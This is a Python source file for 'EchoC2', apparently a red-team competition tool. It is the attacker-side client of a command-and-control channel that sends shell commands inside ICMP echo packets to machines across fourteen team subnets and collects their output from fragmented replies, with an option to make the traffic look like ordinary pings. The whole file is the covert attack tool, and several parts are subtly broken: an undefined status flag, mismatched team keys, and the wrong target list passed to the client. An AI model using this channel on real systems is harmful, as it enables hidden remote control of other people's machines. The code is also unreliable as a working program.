################################
#                              #
#   Created by @RickConsole    #
#     The Emperor Protects     #
#                              #
################################

import subprocess
import socket
import struct
import select
import sys
import os
import time
import argparse

GREEN = "\033[92m"
BLUE = "\033[94m"
RED = "\033[91m"
RESET = "\033[0m"
COMMAND_PREFIX = b"CMD_EXEC:"
RESPONSE_PREFIX = b"CMD_RESPONSE:"
POLL_PREFIX = b"CMD_POLL:"
MAX_RESPONSES = 100         # Max number of response packets to wait for
TIMEOUT = 10                # Timeout when waiting for responses

MAX_PACKET_SIZE = 1024      # Max size of ICMP packets. Larger number = less ICMP replies
                            # Set MAX_PACKET_SIZE to 84 to maintain a standard 98 byte reply

ICMP_HEADER_SIZE = 8
IP_HEADER_SIZE = 20
PAYLOAD_SIZE = MAX_PACKET_SIZE - IP_HEADER_SIZE - ICMP_HEADER_SIZE
FRAGMENT_HEADER_SIZE = 4
FRAGMENT_SIZE = PAYLOAD_SIZE - FRAGMENT_HEADER_SIZE - len(RESPONSE_PREFIX)
agent_ips = {
    'Team1': {'Ubuntu1': '10.1.1.10', 'Ubuntu2': '10.1.1.20', 'DevServer': '10.1.1.30', 'SQLServer': '10.1.1.40'},
    'Team2': {'Ubuntu1': '10.2.1.10', 'Ubuntu2': '10.2.1.20', 'DevServer': '10.2.1.30', 'SQLServer': '10.2.1.40'},
    'Team3': {'Ubuntu1': '10.3.1.10', 'Ubuntu2': '10.3.1.20', 'DevServer': '10.3.1.30', 'SQLServer': '10.3.1.40'},
    'Team4': {'Ubuntu1': '10.4.1.10', 'Ubuntu2': '10.4.1.20', 'DevServer': '10.4.1.30', 'SQLServer': '10.4.1.40'},
    'Team5': {'Ubuntu1': '10.5.1.10', 'Ubuntu2': '10.5.1.20', 'DevServer': '10.5.1.30', 'SQLServer': '10.5.1.40'},
    'Team6': {'Ubuntu1': '10.6.1.10', 'Ubuntu2': '10.6.1.20', 'DevServer': '10.6.1.30', 'SQLServer': '10.6.1.40'},
    'Team7': {'Ubuntu1': '10.7.1.10', 'Ubuntu2': '10.7.1.20', 'DevServer': '10.7.1.30', 'SQLServer': '10.7.1.40'},
    'Team8': {'Ubuntu1': '10.8.1.10', 'Ubuntu2': '10.8.1.20', 'DevServer': '10.8.1.30', 'SQLServer': '10.8.1.40'},
    'Team9': {'Ubuntu1': '10.9.1.10', 'Ubuntu2': '10.9.1.20', 'DevServer': '10.9.1.30', 'SQLServer': '10.9.1.40'},
    'Team10': {'Ubuntu1': '10.10.1.10', 'Ubuntu2': '10.10.1.20', 'DevServer': '10.10.1.30', 'SQLServer': '10.10.1.40'},
    'Team11': {'Ubuntu1': '10.11.1.10', 'Ubuntu2': '10.11.1.20', 'DevServer': '10.11.1.30', 'SQLServer': '10.11.1.40'},
    'Team12': {'Ubuntu1': '10.12.1.10', 'Ubuntu2': '10.12.1.20', 'DevServer': '10.12.1.30', 'SQLServer': '10.12.1.40'},
    'Team13': {'Ubuntu1': '10.13.1.10', 'Ubuntu2': '10.13.1.20', 'DevServer': '10.13.1.30', 'SQLServer': '10.13.1.40'},
    'Team14': {'Ubuntu1': '10.14.1.10', 'Ubuntu2': '10.14.1.20', 'DevServer': '10.14.1.30', 'SQLServer': '10.14.1.40'},
}

def parse_machines(value):
    return [m.strip() for m in value.split(",") if m.strip()]

def parse_teams(value):
    teams = []
    for part in value.split(","):
        if "-" in part:
            start, end = map(int, part.split("-"))
            teams.extend(range(start, end + 1))
        else:
            teams.append(int(part))
    return teams

parser = argparse.ArgumentParser(description='EchoC2')
parser.add_argument("--teams", type=parse_teams, help='Example: "1-5,8,12-14"')
parser.add_argument("--machines", type=parse_machines, help='Example: "machine1,machine2"')
parser.add_argument('--size', type=int, default=1024,
                        help='Max packet size (default: 1024). Use 84 to mimic standard ICMP packet lengths.')
parser.add_argument('--debug', action='store_true', help='Enable debug logging')
parser.add_argument('target', nargs='?', help='Target IP address (required for client mode)')
args = parser.parse_args()

DEBUG = args.debug

def log(message):
    if DEBUG:
        print(f"{RED}[DEBUG]{RESET} {message}", file=sys.stderr, flush=True)

def calculate_checksum(packet):
    if len(packet) % 2 != 0:
        packet += b'\0'
    
    checksum = 0
    for i in range(0, len(packet), 2):
        checksum += (packet[i] << 8) + packet[i+1]
    
    checksum = (checksum >> 16) + (checksum & 0xffff)
    checksum = ~checksum & 0xffff
    return checksum

def create_icmp_socket():
    try:
        return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        log("Error: This script requires root privileges. Please run with sudo.")
        sys.exit(1)

def send_icmp_echo(dest_addr, data, icmp_id=None, icmp_seq=1):
    icmp_socket = create_icmp_socket()
    icmp_socket.setsockopt(socket.SOL_IP, socket.IP_TTL, 64)
    
    icmp_type, icmp_code = 8, 0  
    icmp_checksum = 0
    icmp_id = icmp_id or (os.getpid() & 0xFFFF)
    
    icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
    checksum = calculate_checksum(icmp_header + data)
    icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
    
    packet = icmp_header + data
    log(f"Sending ICMP Echo Request to {dest_addr} with ID: {icmp_id}, Sequence: {icmp_seq}")
    log(f"Payload: {data}")
    try:
        sent = icmp_socket.sendto(packet, (dest_addr, 0))
        log(f"Sent {sent} bytes")
    except Exception as e:
        log(f"Error sending packet: {e}")
    
    return icmp_socket, icmp_id


def receive_icmp_echo(icmp_socket, expected_id, timeout=TIMEOUT, max_responses=MAX_RESPONSES):
    log(f"Waiting for up to {max_responses} ICMP Echo Replies with ID: {expected_id}")
    start_time = time.time()
    responses = []
    fragments = {}
    total_fragments = None
    while time.time() - start_time < timeout and len(responses) < max_responses:
        ready = select.select([icmp_socket], [], [], timeout - (time.time() - start_time))
        if ready[0]:
            try:
                rec_packet, addr = icmp_socket.recvfrom(MAX_PACKET_SIZE)
                ip_header = rec_packet[:IP_HEADER_SIZE]
                icmp_header = rec_packet[IP_HEADER_SIZE:IP_HEADER_SIZE + ICMP_HEADER_SIZE]
                icmp_type, code, checksum, p_id, sequence = struct.unpack('!BBHHH', icmp_header)
                
                log(f"Received ICMP packet from {addr}. Type: {icmp_type}, ID: {p_id}, Sequence: {sequence}")
                
                if icmp_type == 0 and p_id == expected_id:  # Echo Reply
                    payload = rec_packet[IP_HEADER_SIZE + ICMP_HEADER_SIZE:]
                    if payload.startswith(COMMAND_PREFIX):
                        responses.append((icmp_type, payload))
                    elif len(payload) >= FRAGMENT_HEADER_SIZE:  # Fragmented response
                        fragment_number, total_fragments = struct.unpack("!HH", payload[:FRAGMENT_HEADER_SIZE])
                        fragment_data = payload[FRAGMENT_HEADER_SIZE:].rstrip(b'\0')  # Remove padding
                        if fragment_data.startswith(RESPONSE_PREFIX):
                            fragment_data = fragment_data[len(RESPONSE_PREFIX):]
                        fragments[fragment_number] = fragment_data
                        if len(fragments) == total_fragments:
                            complete_payload = b''.join([fragments[i] for i in range(total_fragments)])
                            responses.append((icmp_type, RESPONSE_PREFIX + complete_payload))
                            fragments.clear()
                    if len(responses) == max_responses:
                        log(f"Received maximum number of responses ({max_responses})")
                        break
                else:
                    log(f"Received unexpected ICMP packet. Type: {icmp_type}, ID: {p_id}")
            except Exception as e:
                log(f"Error receiving packet: {e}")
    
    if not responses:
        log("Timeout waiting for ICMP Echo Reply")
    return responses

# Client (attacker)
def client(dest_addrs):
    icmp_id = os.getpid() & 0xFFFF
    seq = 0

    while True:
        command = input(f"{GREEN}EchoC2>{RESET} ")
        if command.lower() == 'exit':
            break
        
        seq += 1
        full_command = COMMAND_PREFIX + command.encode()
        
        for dest_addr in dest_addrs:
            icmp_socket, sent_id = send_icmp_echo(dest_addr, full_command, icmp_id, seq)
            responses = receive_icmp_echo(icmp_socket, sent_id, max_responses=2)
            icmp_socket.close()

            ack_response = None
            cmd_response = None
            
            for icmp_type, response in responses:
                try:
                    if response.startswith(COMMAND_PREFIX):
                        ack_response = response[len(COMMAND_PREFIX):].decode(errors='replace').strip()
                    elif response.startswith(RESPONSE_PREFIX):
                        cmd_response = response[len(RESPONSE_PREFIX):].decode(errors='replace').strip()
                    else:
                        log(f"Unexpected response format: {response[:50]}...")
                except Exception as e:
                    log(f"Error processing response: {e}")
            
            if ack_response:
                print(f"\n{BLUE}[*]{RESET} Command Acknowledgement for {dest_addr}:")
                print(f"Server received: {ack_response}")
            else:
                print(f"\n{RED}[WARN]{RESET} No command acknowledgement received for {dest_addr}")

            if cmd_response:
                print(f"\n{BLUE}[*]{RESET} Command Output from {dest_addr}:")
                print(cmd_response)
            else:
                print(f"\n{RED}[WARN]{RESET} No command output received for {dest_addr}")
            
            if not responses:
                print(f"{RED}[WARN]{RESET} No valid responses received for {dest_addr}")
        
        print()  # Blank line for readability

def display_status():
    print(f"{GREEN}Team X{RESET}")

if __name__ == "__main__":
    MAX_PACKET_SIZE = args.size

    if not args.status and (args.teams is None or args.machines is None):
        parser.error("--teams and --machines are required unless --status is set")
    
    if args.status:
        display_status()

    targets = []
    for team in args.teams:
        for machine in args.machines:
            targets.append(agent_ips[team][machine])
    print("""
  _____     _            ____ ____  
 | ____|___| |__   ___  / ___|___ \ 
 |  _| / __| '_ \ / _ \| |     __) |
 | |__| (__| | | | (_) | |___ / __/ 
 |_____\___|_| |_|\___/ \____|_____|
                                    """)
    print("Welcome to EchoC2. Use 'exit' to quit.\n")
    client(args.target)
